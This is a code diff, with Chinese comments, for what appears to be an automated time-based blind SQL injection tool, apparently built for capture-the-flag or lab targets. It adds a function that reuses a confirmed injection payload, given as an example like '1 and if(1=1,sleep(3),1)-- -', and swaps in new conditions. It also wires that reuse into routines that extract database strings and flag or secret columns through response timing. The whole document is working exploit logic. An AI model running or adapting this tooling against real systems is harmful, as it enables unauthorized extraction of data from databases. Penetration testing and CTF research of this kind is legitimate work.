@@ -12,6 +12,7 @@
 """
 from __future__ import annotations
 
+import re
 import statistics
 
 from app.services.prober import _build_request, _elapsed, _is_waf_block
@@ -74,9 +75,69 @@ def time_hit(baseline_s: float, probe_s: float, sec: int = _SEC) -> bool:
     return (probe_s - baseline_s) >= max(0.8, sec * 0.6)
 
 
+def _split_top_level(text: str) -> list[str]:
+    """按**顶层**逗号切分（忽略括号内的逗号）。"""
+    parts: list[str] = []
+    depth, last = 0, 0
+    for i, ch in enumerate(text):
+        if ch == "(":
+            depth += 1
+        elif ch == ")":
+            depth -= 1
+        elif ch == "," and depth == 0:
+            parts.append(text[last:i])
+            last = i + 1
+    parts.append(text[last:])
+    return parts
+
+
+def reuse_template(payload_hint: str | None, cond: str, sec: int = _SEC,
+                   dbms: str = "mysql") -> str | None:
+    """从**已确认 payload** 复用注入语境，只替换 IF(...) 里的条件与延时。
+
+    确认 payload 是现场实测有效的：引号/括号闭合、注释结尾、空格/编码绕过
+    形态全部保留，只替换中间的判断条件。定位不到可替换的 IF(...) 返回 None，
+    由调用方回退到 build_payload（规则拼装）。
+
+    MySQL 例：
+        确认: 1 and if(1=1,sleep(3),1)-- -
+        复用: 1 and if(<cond>,sleep(2),1)-- -
+    """
+    if normalize_dbms(dbms) != "mysql":
+        return None
+    p = payload_hint or ""
+    m = re.search(r"\bif\s*\(", p, re.I)
+    if not m:
+        return None
+    open_idx = p.find("(", m.start())
+    depth, close = 0, None
+    for i in range(open_idx, len(p)):
+        ch = p[i]
+        if ch == "(":
+            depth += 1
+        elif ch == ")":
+            depth -= 1
+            if depth == 0:
+                close = i
+                break
+    if close is None:
+        return None
+    parts = _split_top_level(p[open_idx + 1:close])
+    if len(parts) < 3:
+        return None
+    # parts = [原条件, sleep(...), 假值表达式]
+    false_expr = parts[2].strip()
+    new_inner = f"({cond}),sleep({int(sec)}),{false_expr}"
+    return p[:open_idx + 1] + new_inner + p[close:]
+
+
 class _Prober:
     def __init__(self, client, endpoint, param, base_value, dbms, slash_first=False,
-                 quote: str = "'", sec: int = _SEC, deadline: float | None = None):
+                 quote: str = "'", sec: int = _SEC, deadline: float | None = None,
+                 builder=None):
+        # builder(cond) -> payload | None：优先使用的「模板复用」构造函数；
+        # 返回 None 时回退 build_payload。
+        self.builder = builder
         self.client = client
         self.endpoint = endpoint
         self.param = param
@@ -119,8 +180,16 @@ class _Prober:
         if self.deadline and _time.monotonic() > self.deadline:
             self.error = "deadline"
             return None
-        payload = build_payload(self.base_value, cond, self.dbms, slash=self.slash,
-                                quote=self.quote, sec=self.sec)
+        payload = None
+        if self.builder is not None:
+            try:
+                payload = self.builder(cond)
+            except Exception:
+                payload = None
+        if not payload:
+            payload = build_payload(self.base_value, cond, self.dbms,
+                                    slash=self.slash, quote=self.quote,
+                                    sec=self.sec)
         if not payload:
             return None
         self.last_payload = payload
@@ -184,18 +253,22 @@ class _Prober:
 def extract_scalar(client, endpoint, param: str, base_value, dbms: str, expr: str,
                    *, slash_first: bool = False, max_len: int = 32,
                    quote: str = "'", sec: int = _SEC,
-                   deadline: float | None = None, progress_cb=None) -> dict:
+                   deadline: float | None = None, progress_cb=None,
+                   payload_hint: str | None = None) -> dict:
     """提取标量字符串（如 current_database()）。
 
     返回 {value, requests, error}。value 为空字符串表示条件成立但不可见。
     quote：注入语境闭合符（由已确认 payload 反推）；sec：单次 sleep 秒数。
+    payload_hint：已确认 payload。给了就先做**模板复用**（保留语境只换条件），
+    定位不到才回退到按 quote 拼装。
     """
     nd = normalize_dbms(dbms)
     if nd not in ("postgresql", "mysql", "mssql", "oracle"):
         return {"value": None, "requests": 0,
                 "error": f"unsupported dbms for time extraction: {dbms}"}
+    builder = (lambda c: reuse_template(payload_hint, c, sec, nd)) if payload_hint else None
     prober = _Prober(client, endpoint, param, base_value, nd, slash_first=slash_first,
-                     quote=quote, sec=sec, deadline=deadline)
+                     quote=quote, sec=sec, deadline=deadline, builder=builder)
     value = prober.extract_string(expr, max_len=max_len, progress_cb=progress_cb)
     return {"value": value, "requests": prober.requests, "error": prober.error,
             "partial": getattr(prober, "partial", False),
@@ -230,7 +303,8 @@ def _score_column(table: str, column: str) -> int:
 
 def extract_flag_blind(client, endpoint, param: str, base_value, dbms: str, *,
                        quote: str = "'", sec: int = 1,
-                       deadline: float | None = None, max_len: int = 96) -> dict:
+                       deadline: float | None = None, max_len: int = 96,
+                       payload_hint: str | None = None) -> dict:
     """纯时间盲注靶直接取 flag（只读 SELECT，最短路径）。
 
     2026-10-23 某靶场 实测：sqlmap 时间盲注枚举 `--current-db` 300s 都跑不完
@@ -241,8 +315,9 @@ def extract_flag_blind(client, endpoint, param: str, base_value, dbms: str, *,
     """
     if normalize_dbms(dbms) != "mysql":
         return {"value": None, "requests": 0, "error": f"unsupported dbms: {dbms}"}
+    builder = (lambda c: reuse_template(payload_hint, c, sec, "mysql")) if payload_hint else None
     prober = _Prober(client, endpoint, param, base_value, "mysql",
-                     quote=quote, sec=sec, deadline=deadline)
+                     quote=quote, sec=sec, deadline=deadline, builder=builder)
     # 先取 flag/secret 命名的列（短清单）；没有再做全量列清单。
     cols_raw = prober.extract_string(_COLS_EXPR_MYSQL_FILTERED, max_len=96) or ""
     pairs: list[tuple[str, str]] = []
